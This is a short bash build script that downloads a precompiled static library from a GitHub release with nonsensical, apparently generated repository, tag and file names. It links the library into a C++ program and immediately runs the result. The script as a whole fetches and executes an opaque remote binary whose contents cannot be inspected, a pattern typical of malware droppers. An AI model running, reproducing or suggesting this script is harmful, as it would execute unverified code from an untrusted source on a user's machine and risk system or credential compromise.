#!/usr/bin/env bash
set -e
REPO="jtailandezj/celerymoundio"
TAG="gentle-garden-gentle-garden"
LIB="blank-funicular.a"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "$URL" --output "$LIB"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
